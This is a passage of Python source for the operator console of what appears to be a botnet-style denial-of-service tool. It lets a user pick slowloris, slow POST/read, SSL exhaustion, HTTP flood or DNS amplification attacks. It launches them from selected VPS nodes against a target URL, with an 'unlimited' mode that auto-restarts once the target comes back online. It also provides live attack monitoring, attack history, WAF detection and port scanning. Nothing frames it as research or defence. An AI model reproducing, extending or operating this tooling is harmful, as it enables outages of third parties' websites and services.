            print("\nDuration options:")
            print("1. Limited duration (specify seconds)")
            print("2. Unlimited duration (attack continues until manually stopped)")
            
            duration_choice = self.terminal.input_with_validation(
                "Select duration option (1-2)",
                lambda x: x in ['1', '2'],
                "Invalid choice"
            )
            
            if duration_choice == '1':
                duration = self.terminal.input_with_validation(
                    "Enter attack duration in seconds",
                    lambda x: x.isdigit() and int(x) > 0,
                    "Must be a positive number",
                    default="300"
                )
                parameters = {
                    'connections': int(connections),
                    'duration': int(duration),
                    'unlimited': False
                }
            else:
                print(f"\n{Colors.YELLOW}[WARNING] Unlimited attack will continue until manually stopped{Colors.RESET}")
                parameters = {
                    'connections': int(connections),
                    'duration': 2147483647,  # ~24.8 days, effectively unlimited
                    'unlimited': True,
                    'auto_restart': True
                }
                
                # Ask about auto-restart when target becomes available
                auto_restart = self.terminal.confirm_action(
                    "Enable auto-restart when target becomes unavailable and then available again?",
                    default=True
                )
                parameters['auto_restart'] = auto_restart
                
                # Ask about check interval
                if auto_restart:
                    check_interval = self.terminal.input_with_validation(
                        "Enter target availability check interval in seconds",
                        lambda x: x.isdigit() and int(x) > 0,
                        "Must be a positive number",
                        default="60"
                    )
                    parameters['check_interval'] = int(check_interval)
            
            # Get attack-specific parameters
            if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
                delay = self.terminal.input_with_validation(
                    "Enter delay between packets in seconds",
                    lambda x: x.replace('.', '', 1).isdigit() and float(x) > 0,
                    "Must be a positive number",
                    default="15"
                )
                parameters['delay'] = float(delay)
            
            if attack_type == 'http_flood':
                requests = self.terminal.input_with_validation(
                    "Enter requests per connection",
                    lambda x: x.isdigit() and int(x) > 0,
                    "Must be a positive number",
                    default="1000"
                )
                parameters['requests'] = int(requests)
            
            if attack_type == 'dns_amplification':
                target_ip = self.terminal.input_with_validation(
                    "Enter target IP address",
                    lambda x: self.db_manager.security.validate_ip_address(x),
                    "Invalid IP address format"
                )
                parameters['target_ip'] = target_ip
            
            # Select VPS nodes
            print(f"\n{Colors.CYAN}Select VPS nodes to use (comma-separated IDs, or 'all' for all):{Colors.RESET}")
            vps_selection = input("VPS IDs: ").strip()
            
            selected_vps = []
            if vps_selection.lower() == 'all':
                selected_vps = [vps['ip_address'] for vps in online_vps]
            else:
                try:
                    vps_ids = [int(id.strip()) for id in vps_selection.split(',')]
                    for vps_id in vps_ids:
                        vps = next((v for v in vps_list if v['id'] == vps_id), None)
                        if vps and vps['status'] == 'online':
                            selected_vps.append(vps['ip_address'])
                except ValueError:
                    print(f"\n{Colors.RED}Invalid VPS selection.{Colors.RESET}")
                    input("\nPress Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"\n{Colors.RED}No valid VPS nodes selected.{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            # Confirm attack
            print(f"\n{Colors.CYAN}Attack Summary:{Colors.RESET}")
            print(f"Session Name: {session_name}")
            print(f"Target: {target_url}")
            print(f"Attack Type: {attack_type}")
            print(f"Connections per VPS: {connections}")
            
            if parameters['unlimited']:
                print(f"Duration: {Colors.YELLOW}UNLIMITED{Colors.RESET}")
                print(f"Auto-restart: {'Yes' if parameters['auto_restart'] else 'No'}")
                if parameters['auto_restart']:
                    print(f"Check interval: {parameters['check_interval']} seconds")
            else:
                print(f"Duration: {parameters['duration']} seconds")
                
            print(f"VPS Nodes: {len(selected_vps)}")
            
            if not self.terminal.confirm_action("Launch attack with these settings?"):
                print(f"\n{Colors.YELLOW}Attack cancelled.{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            # Create attack session
            session_id = self.db_manager.create_attack_session(
                session_name,
                target_host,
                target_url,
                attack_type,
                selected_vps,
                parameters
            )
            
            print(f"\n{Colors.CYAN}Created attack session with ID: {session_id}{Colors.RESET}")
            print(f"{Colors.CYAN}Launching attack...{Colors.RESET}")
            
            # Launch attack
            success = self.attack_manager.launch_attack(
                session_id,
                target_url,
                attack_type,
                selected_vps,
                parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}Attack launched successfully!{Colors.RESET}")
                
                # Ask to monitor attack
                if self.terminal.confirm_action("Monitor attack now?", default=True):
                    self.monitor_attack(session_id)
            else:
                print(f"\n{Colors.RED}Failed to launch attack.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def monitor_attacks_menu(self):
        """Monitor attacks menu"""
        self.terminal.clear_screen()
        self.terminal.print_header("MONITOR ATTACKS")
        
        # Get running attacks
        running_attacks = self.db_manager.get_all_attack_sessions(status='running')
        
        if not running_attacks:
            print(f"\n{Colors.YELLOW}No running attacks found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display running attacks
        headers = ["ID", "Name", "Target", "Attack Type", "Start Time", "VPS Nodes"]
        data = []
        
        for attack in running_attacks:
            vps_nodes = attack['vps_nodes'].split(',') if attack['vps_nodes'] else []
            
            data.append([
                attack['id'],
                attack['session_name'],
                attack['target_host'],
                attack['attack_type'],
                attack['start_time'],
                len(vps_nodes)
            ])
        
        self.terminal.print_table(headers, data)
        
        try:
            session_id = input("\nEnter attack ID to monitor (0 to cancel): ")
            
            if session_id == '0':
                return
            
            self.monitor_attack(int(session_id))
            
        except ValueError:
            print(f"\n{Colors.RED}Please enter a valid ID.{Colors.RESET}")
            input("\nPress Enter to continue...")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def monitor_attack(self, session_id):
        """Monitor a specific attack"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        if session['status'] != 'running':
            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
        
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
        print(f"Target: {session['target_url']}")
        print(f"Attack Type: {session['attack_type']}")
        print(f"VPS Nodes: {len(vps_list)}")
        print("=" * 50)
        
        print(f"{Colors.YELLOW}Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(1)
        
        try:
            monitoring = True
            refresh_interval = 2  # seconds
            
            while monitoring:
                self.terminal.clear_screen()
                print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
                print(f"Target: {session['target_url']}")
                print(f"Attack Type: {session['attack_type']}")
                print(f"VPS Nodes: {len(vps_list)}")
                
                # Calculate duration
                if session['start_time']:
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    duration = (datetime.now() - start).total_seconds()
                    duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
                    
                    # Check if this is an unlimited attack
                    is_unlimited = False
                    auto_restart = False
                    if session['parameters'] and isinstance(session['parameters'], dict):
                        is_unlimited = session['parameters'].get('unlimited', False)
                        auto_restart = session['parameters'].get('auto_restart', False)
                    
                    if is_unlimited:
                        print(f"Duration: {Colors.YELLOW}UNLIMITED{Colors.RESET} (Running for {duration_str})")
                        print(f"Auto-restart: {'Yes' if auto_restart else 'No'}")
                    else:
                        print(f"Duration: {duration_str}")
                
                print("=" * 50)
                
                # Get latest results
                results = self.db_manager.get_attack_results(session_id, limit=len(vps_list) * 2)
                
                if results:
                    # Group by VPS
                    vps_results = {}
                    for result in results:
                        vps_ip = result['vps_ip']
                        if vps_ip not in vps_results:
                            vps_results[vps_ip] = []
                        vps_results[vps_ip].append(result)
                    
                    # Display latest result for each VPS
                    headers = ["VPS", "Connections", "Packets", "Bytes", "Errors", "CPU", "Memory", "Status"]
                    data = []
                    
                    for vps_ip, vps_data in vps_results.items():
                        latest = vps_data[0]  # Most recent result first
                        
                        status_str = latest['status']
                        if status_str == 'running':
                            status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
                        elif status_str == 'error':
                            status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
                        else:
                            status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
                        
                        data.append([
                            vps_ip,
                            latest['connections_active'],
                            latest['packets_sent'],
                            self._format_bytes(latest['bytes_sent']),
                            latest['error_count'],
                            f"{latest['cpu_usage']:.1f}%" if latest['cpu_usage'] is not None else 'N/A',
                            f"{latest['memory_usage']:.1f}%" if latest['memory_usage'] is not None else 'N/A',
                            status_str
                        ])
                    
                    self.terminal.print_table(headers, data)
                    
                    # Calculate and show totals
                    total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
                    total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
                    total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
                    total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
                    
                    print(f"\n{Colors.BOLD}TOTALS:{Colors.RESET}")
                    print(f"Connections: {total_connections} | Packets: {total_packets} | Data: {self._format_bytes(total_bytes)} | Errors: {total_errors}")
                    
                    # Show response codes if available
                    response_codes = {}
                    for result in results:
                        if result['response_codes']:
                            try:
                                codes = json.loads(result['response_codes'])
                                for code, count in codes.items():
                                    if code not in response_codes:
                                        response_codes[code] = 0
                                    response_codes[code] += count
                            except:
                                pass
                    
                    if response_codes:
                        print(f"\n{Colors.BOLD}RESPONSE CODES:{Colors.RESET}")
                        for code, count in sorted(response_codes.items()):
                            color = Colors.GREEN if code.startswith('2') else Colors.YELLOW if code.startswith('3') else Colors.RED
                            print(f"{color}{code}: {count}{Colors.RESET}", end=" | ")
                        print()
                else:
                    print(f"\n{Colors.YELLOW}No results available yet{Colors.RESET}")
                
                print(f"\n{Colors.YELLOW}Press Ctrl+C to stop monitoring | Refreshing every {refresh_interval}s{Colors.RESET}")
                
                # Check if attack is still running
                updated_session = self.db_manager.get_attack_session(session_id)
                if updated_session['status'] != 'running':
                    print(f"\n{Colors.YELLOW}Attack is no longer running (status: {updated_session['status']}){Colors.RESET}")
                    input("Press Enter to continue...")
                    break
                
                # Wait for refresh interval with check for keyboard interrupt
                try:
                    time.sleep(refresh_interval)
                except KeyboardInterrupt:
                    monitoring = False
                    print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
                    
                    # Ask if user wants to stop the attack
                    if self.terminal.confirm_action("Stop the attack?"):
                        print(f"\n{Colors.CYAN}Stopping attack...{Colors.RESET}")
                        if self.attack_manager.stop_attack(session_id):
                            print(f"\n{Colors.GREEN}Attack stopped successfully.{Colors.RESET}")
                        else:
                            print(f"\n{Colors.RED}Failed to stop attack.{Colors.RESET}")
                    
                    input("Press Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error monitoring attack: {str(e)}")
            logger.error(traceback.format_exc())
            input("Press Enter to continue...")
    
    def _format_bytes(self, bytes_value):
        """Format bytes to human-readable format"""
        if bytes_value is None:
            return 'N/A'
        
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.1f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.1f} TB"
    
    def attack_history_menu(self):
        """Attack history menu"""
        self.terminal.clear_screen()
        self.terminal.print_header("ATTACK HISTORY")
        
        # Get all attacks
        attacks = self.db_manager.get_all_attack_sessions(limit=50)
        
        if not attacks:
            print(f"\n{Colors.YELLOW}No attack history found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        # Display attacks
        headers = ["ID", "Name", "Target", "Attack Type", "Status", "Start Time", "End Time"]
        data = []
        
        for attack in attacks:
            status_str = attack['status']
            if status_str == 'running':
                status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
            elif status_str == 'completed':
                status_str = f"{Colors.BLUE}{status_str}{Colors.RESET}"
            elif status_str == 'failed':
                status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
            else:
                status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
            
            data.append([
                attack['id'],
                attack['session_name'],
                attack['target_host'],
                attack['attack_type'],
                status_str,
                attack['start_time'],
                attack['end_time'] if attack['end_time'] else '-'
            ])
        
        self.terminal.print_table(headers, data)
        
        try:
            session_id = input("\nEnter attack ID to view details (0 to cancel): ")
            
            if session_id == '0':
                return
            
            self.view_attack_details(int(session_id))
            
        except ValueError:
            print(f"\n{Colors.RED}Please enter a valid ID.{Colors.RESET}")
            input("\nPress Enter to continue...")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def view_attack_details(self, session_id):
        """View attack details"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"\n{Colors.RED}Attack session not found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        self.terminal.clear_screen()
        self.terminal.print_header(f"ATTACK DETAILS: {session['session_name']}")
        
        # Display attack details
        print(f"{Colors.BOLD}General Information:{Colors.RESET}")
        print(f"ID: {session['id']}")
        print(f"Name: {session['session_name']}")
        print(f"Target Host: {session['target_host']}")
        print(f"Target URL: {session['target_url']}")
        print(f"Attack Type: {session['attack_type']}")
        
        status_str = session['status']
        if status_str == 'running':
            status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
        elif status_str == 'completed':
            status_str = f"{Colors.BLUE}{status_str}{Colors.RESET}"
        elif status_str == 'failed':
            status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
        else:
            status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
        
        print(f"Status: {status_str}")
        print(f"Start Time: {session['start_time']}")
        print(f"End Time: {session['end_time'] if session['end_time'] else 'N/A'}")
        
        # Calculate duration
        if session['start_time']:
            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
            
            if session['end_time']:
                end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
                duration = (end - start).total_seconds()
            else:
                duration = (datetime.now() - start).total_seconds()
                
            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
            
            # Check if this is an unlimited attack
            is_unlimited = False
            auto_restart = False
            if session['parameters'] and isinstance(session['parameters'], dict):
                is_unlimited = session['parameters'].get('unlimited', False)
                auto_restart = session['parameters'].get('auto_restart', False)
            
            if is_unlimited:
                print(f"Duration: {Colors.YELLOW}UNLIMITED{Colors.RESET} (Running for {duration_str})")
                print(f"Auto-restart: {'Yes' if auto_restart else 'No'}")
                if auto_restart and 'check_interval' in session['parameters']:
                    print(f"Check interval: {session['parameters']['check_interval']} seconds")
            else:
                print(f"Duration: {duration_str}")
        
        # Display parameters
        print(f"\n{Colors.BOLD}Attack Parameters:{Colors.RESET}")
        for key, value in session['parameters'].items():
            print(f"{key}: {value}")
        
        # Display VPS nodes
        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
        print(f"\n{Colors.BOLD}VPS Nodes ({len(vps_list)}):{Colors.RESET}")
        for vps_ip in vps_list:
            print(f"- {vps_ip}")
        
        # Get attack results
        results = self.db_manager.get_attack_results(session_id, limit=100)
        
        if results:
            print(f"\n{Colors.BOLD}Attack Results:{Colors.RESET}")
            
            # Group by VPS
            vps_results = {}
            for result in results:
                vps_ip = result['vps_ip']
                if vps_ip not in vps_results:
                    vps_results[vps_ip] = []
                vps_results[vps_ip].append(result)
            
            # Calculate totals
            total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
            total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
            total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
            total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
            
            print(f"Total Connections: {total_connections}")
            print(f"Total Packets Sent: {total_packets}")
            print(f"Total Data Sent: {self._format_bytes(total_bytes)}")
            print(f"Total Errors: {total_errors}")
            
            # Show response codes if available
            response_codes = {}
            for result in results:
                if result['response_codes']:
                    try:
                        codes = json.loads(result['response_codes'])
                        for code, count in codes.items():
                            if code not in response_codes:
                                response_codes[code] = 0
                            response_codes[code] += count
                    except:
                        pass
            
            if response_codes:
                print(f"\n{Colors.BOLD}Response Codes:{Colors.RESET}")
                for code, count in sorted(response_codes.items()):
                    color = Colors.GREEN if code.startswith('2') else Colors.YELLOW if code.startswith('3') else Colors.RED
                    print(f"{color}{code}: {count}{Colors.RESET}", end=" | ")
                print()
            
            # Display latest result for each VPS
            print(f"\n{Colors.BOLD}Latest Results by VPS:{Colors.RESET}")
            headers = ["VPS", "Connections", "Packets", "Bytes", "Errors", "Status", "Timestamp"]
            data = []
            
            for vps_ip, vps_data in vps_results.items():
                latest = vps_data[0]  # Most recent result first
                
                status_str = latest['status']
                if status_str == 'running':
                    status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
                elif status_str == 'error':
                    status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
                else:
                    status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
                
                data.append([
                    vps_ip,
                    latest['connections_active'],
                    latest['packets_sent'],
                    self._format_bytes(latest['bytes_sent']),
                    latest['error_count'],
                    status_str,
                    latest['timestamp']
                ])
            
            self.terminal.print_table(headers, data)
        else:
            print(f"\n{Colors.YELLOW}No results available for this attack.{Colors.RESET}")
        
        # Display options
        print("\nOptions:")
        print("1. Export attack details to file")
        if session['status'] == 'running':
            print("2. Stop attack")
            print("3. Monitor attack")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter your choice: "))
            
            if choice == 1:
                self.export_attack_details(session_id)
            elif choice == 2 and session['status'] == 'running':
                if self.terminal.confirm_action("Are you sure you want to stop this attack?"):
                    print(f"\n{Colors.CYAN}Stopping attack...{Colors.RESET}")
                    if self.attack_manager.stop_attack(session_id):
                        print(f"\n{Colors.GREEN}Attack stopped successfully.{Colors.RESET}")
                    else:
                        print(f"\n{Colors.RED}Failed to stop attack.{Colors.RESET}")
                    input("\nPress Enter to continue...")
            elif choice == 3 and session['status'] == 'running':
                self.monitor_attack(session_id)
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def export_attack_details(self, session_id):
        """Export attack details to file"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"\n{Colors.RED}Attack session not found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        filename = f"attack_{session_id}_{session['session_name'].replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(f"ATTACK DETAILS: {session['session_name']}\n")
                f.write("=" * 50 + "\n\n")
                
                f.write("General Information:\n")
                f.write(f"ID: {session['id']}\n")
                f.write(f"Name: {session['session_name']}\n")
                f.write(f"Target Host: {session['target_host']}\n")
                f.write(f"Target URL: {session['target_url']}\n")
                f.write(f"Attack Type: {session['attack_type']}\n")
                f.write(f"Status: {session['status']}\n")
                f.write(f"Start Time: {session['start_time']}\n")
                f.write(f"End Time: {session['end_time'] if session['end_time'] else 'N/A'}\n")
                
                # Calculate duration
                if session['start_time']:
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    
                    if session['end_time']:
                        end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
                        duration = (end - start).total_seconds()
                    else:
                        duration = (datetime.now() - start).total_seconds()
                        
                    duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
                    f.write(f"Duration: {duration_str}\n")
                
                # Write parameters
                f.write("\nAttack Parameters:\n")
                for key, value in session['parameters'].items():
                    f.write(f"{key}: {value}\n")
                
                # Write VPS nodes
                vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
                f.write(f"\nVPS Nodes ({len(vps_list)}):\n")
                for vps_ip in vps_list:
                    f.write(f"- {vps_ip}\n")
                
                # Get attack results
                results = self.db_manager.get_attack_results(session_id, limit=100)
                
                if results:
                    f.write("\nAttack Results:\n")
                    
                    # Calculate totals
                    total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
                    total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
                    total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
                    total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
                    
                    f.write(f"Total Connections: {total_connections}\n")
                    f.write(f"Total Packets Sent: {total_packets}\n")
                    f.write(f"Total Data Sent: {self._format_bytes(total_bytes)}\n")
                    f.write(f"Total Errors: {total_errors}\n")
                    
                    # Show response codes if available
                    response_codes = {}
                    for result in results:
                        if result['response_codes']:
                            try:
                                codes = json.loads(result['response_codes'])
                                for code, count in codes.items():
                                    if code not in response_codes:
                                        response_codes[code] = 0
                                    response_codes[code] += count
                            except:
                                pass
                    
                    if response_codes:
                        f.write("\nResponse Codes:\n")
                        for code, count in sorted(response_codes.items()):
                            f.write(f"{code}: {count}\n")
                    
                    # Group by VPS
                    vps_results = {}
                    for result in results:
                        vps_ip = result['vps_ip']
                        if vps_ip not in vps_results:
                            vps_results[vps_ip] = []
                        vps_results[vps_ip].append(result)
                    
                    # Write results for each VPS
                    f.write("\nResults by VPS:\n")
                    for vps_ip, vps_data in vps_results.items():
                        f.write(f"\nVPS: {vps_ip}\n")
                        f.write("-" * 30 + "\n")
                        
                        for result in vps_data[:5]:  # Show up to 5 results per VPS
                            f.write(f"Timestamp: {result['timestamp']}\n")
                            f.write(f"Status: {result['status']}\n")
                            f.write(f"Connections: {result['connections_active']}\n")
                            f.write(f"Packets: {result['packets_sent']}\n")
                            f.write(f"Bytes: {self._format_bytes(result['bytes_sent'])}\n")
                            f.write(f"Errors: {result['error_count']}\n")
                            f.write(f"CPU: {result['cpu_usage']}%\n" if result['cpu_usage'] is not None else "CPU: N/A\n")
                            f.write(f"Memory: {result['memory_usage']}%\n" if result['memory_usage'] is not None else "Memory: N/A\n")
                            f.write("-" * 20 + "\n")
                else:
                    f.write("\nNo results available for this attack.\n")
            
            print(f"\n{Colors.GREEN}Attack details exported to {filename}{Colors.RESET}")
            input("\nPress Enter to continue...")
            
        except Exception as e:
            print(f"\n{Colors.RED}Error exporting attack details: {str(e)}{Colors.RESET}")
            input("\nPress Enter to continue...")
    
    def network_tools_menu(self):
        """Network tools menu"""
        while True:
            self.terminal.clear_screen()
            self.terminal.print_header("NETWORK TOOLS")
            
            options = [
                "DNS Lookup",
                "WAF Detection",
                "Port Scanner",
                "Traceroute",
                "WHOIS Lookup"
            ]
            
            choice = self.terminal.input_menu("NETWORK TOOLS", options)
            
            if choice == 1:
                self.dns_lookup_tool()
            elif choice == 2:
                self.waf_detection_tool()
            elif choice == 3:
                self.port_scanner_tool()
            elif choice == 4:
                self.traceroute_tool()
            elif choice == 5:
                self.whois_lookup_tool()
            elif choice == 0:
                break
    
    def dns_lookup_tool(self):
        """DNS lookup tool"""
        self.terminal.clear_screen()
        self.terminal.print_header("DNS LOOKUP")
        
        try:
            domain = self.terminal.input_with_validation(
                "Enter domain name",
                lambda x: len(x) > 0 and '.' in x,
                "Invalid domain format"
            )
            
            print(f"\n{Colors.CYAN}Looking up DNS records for {domain}...{Colors.RESET}")
            
            results = self.network_tools.lookup_dns_history(domain)
            
            print(f"\n{Colors.BOLD}DNS Records for {domain}:{Colors.RESET}")
            
            if results['current_records']:
                for record_type, records in results['current_records'].items():
                    print(f"\n{Colors.CYAN}{record_type} Records:{Colors.RESET}")
                    for record in records:
                        print(f"  {record}")
            else:
                print(f"\n{Colors.YELLOW}No DNS records found.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def waf_detection_tool(self):
        """WAF detection tool"""
        self.terminal.clear_screen()
        self.terminal.print_header("WAF DETECTION")
        
        try:
            target_url = self.terminal.input_with_validation(
                "Enter target URL (e.g., http://example.com)",
                lambda x: self.db_manager.security.validate_url(x),
                "Invalid URL format"
            )
            
            print(f"\n{Colors.CYAN}Detecting WAF on {target_url}...{Colors.RESET}")
            print(f"{Colors.YELLOW}This may take a moment. Please wait...{Colors.RESET}")
            
            results = self.network_tools.detect_waf(target_url)
            
            print(f"\n{Colors.BOLD}WAF Detection Results for {target_url}:{Colors.RESET}")
            
            if results['waf_detected']:
                print(f"\n{Colors.GREEN}WAF Detected: Yes{Colors.RESET}")
                print(f"WAF Type: {results['waf_type']}")
                print(f"Confidence: {results['confidence']}%")
                
                if results['details']:
                    print("\nDetails:")
                    for detail in results['details']:
                        print(f"  - {detail}")
            else:
                print(f"\n{Colors.YELLOW}WAF Detected: No{Colors.RESET}")
                print("No WAF was detected on this target.")
                
                if results['details']:
                    print("\nDetails:")
                    for detail in results['details']:
                        print(f"  - {detail}")
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def port_scanner_tool(self):
        """Port scanner tool"""
        self.terminal.clear_screen()
        self.terminal.print_header("PORT SCANNER")
        
        try:
            target_host = self.terminal.input_with_validation(
                "Enter target hostname or IP",
                lambda x: len(x) > 0,
                "Invalid hostname or IP"
            )
            
            port_range = self.terminal.input_with_validation(
                "Enter port range (e.g., 80,443 or 1-1000 or common)",
                lambda x: len(x) > 0,
                "Invalid port range"
            )
            
            ports = []
            if port_range.lower() == 'common':
                ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 8080, 8443]
                print(f"\n{Colors.CYAN}Scanning common ports on {target_host}...{Colors.RESET}")
            else:
                try:
                    if ',' in port_range:
                        # Comma-separated list
                        ports = [int(p.strip()) for p in port_range.split(',')]
                    elif '-' in port_range:
                        # Range
                        start, end = port_range.split('-')
                        ports = list(range(int(start), int(end) + 1))
                    else:
                        # Single port
                        ports = [int(port_range)]
                    
                    print(f"\n{Colors.CYAN}Scanning {len(ports)} ports on {target_host}...{Colors.RESET}")
                except ValueError:
                    print(f"\n{Colors.RED}Invalid port range format.{Colors.RESET}")
                    input("\nPress Enter to continue...")
                    return
            
            print(f"{Colors.YELLOW}This may take a moment. Please wait...{Colors.RESET}")
            
            results = self.network_tools.scan_ports(target_host, ports)
            
            if 'error' in results:
                print(f"\n{Colors.RED}Error: {results['error']}{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}Port Scan Results for {target_host}:{Colors.RESET}")
            print(f"Scan completed in {results['scan_time']} seconds")
            
            if results['open_ports']:
                print(f"\n{Colors.GREEN}Open Ports:{Colors.RESET}")
                headers = ["Port", "Service"]
                data = []
                
                for port_info in results['open_ports']:
                    data.append([port_info['port'], port_info['service']])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}No open ports found.{Colors.RESET}")
            
            if results['filtered_ports']:
                print(f"\n{Colors.YELLOW}Filtered Ports: {len(results['filtered_ports'])}{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def traceroute_tool(self):
        """Traceroute tool"""
        self.terminal.clear_screen()
        self.terminal.print_header("TRACEROUTE")
        
        try:
            target_host = self.terminal.input_with_validation(
                "Enter target hostname or IP",
                lambda x: len(x) > 0,
                "Invalid hostname or IP"
            )
            
            max_hops = self.terminal.input_with_validation(
                "Enter maximum hops",
                lambda x: x.isdigit() and 1 <= int(x) <= 50,
                "Invalid number of hops (1-50)",
                default="30"
            )
            
            print(f"\n{Colors.CYAN}Performing traceroute to {target_host} (max {max_hops} hops)...{Colors.RESET}")
            print(f"{Colors.YELLOW}This may take a moment. Please wait...{Colors.RESET}")
            
            results = self.network_tools.traceroute(target_host, int(max_hops))
            
            if 'error' in results:
                print(f"\n{Colors.RED}Error: {results['error']}{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}Traceroute Results for {target_host}:{Colors.RESET}")
            
            if results['hops']:
                headers = ["Hop", "IP", "Hostname", "RTT (ms)"]
                data = []
                
                for hop in results['hops']:
                    hostname = hop['hostname'] if hop['hostname'] else ''
                    rtt = f"{hop['rtt']} ms" if hop['rtt'] is not None else '*'
                    
                    data.append([
                        hop['hop'],
                        hop['ip'],
                        hostname,
                        rtt
                    ])
                
                self.terminal.print_table(headers, data)
                
                if results['complete']:
                    print(f"\n{Colors.GREEN}Traceroute completed successfully.{Colors.RESET}")
                else:
                    print(f"\n{Colors.YELLOW}Traceroute did not reach the destination.{Colors.RESET}")
            else:
                print(f"\n{Colors.YELLOW}No route found.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def whois_lookup_tool(self):
        """WHOIS lookup tool"""
        self.terminal.clear_screen()
        self.terminal.print_header("WHOIS LOOKUP")
        
        try:
            domain = self.terminal.input_with_validation(
                "Enter domain name",
                lambda x: len(x) > 0 and '.' in x,
                "Invalid domain format"
            )
            
            print(f"\n{Colors.CYAN}Looking up WHOIS information for {domain}...{Colors.RESET}")
            
            results = self.network_tools.whois_lookup(domain)
            
            print(f"\n{Colors.BOLD}WHOIS Information for {domain}:{Colors.RESET}")
            
            if 'error' in results:
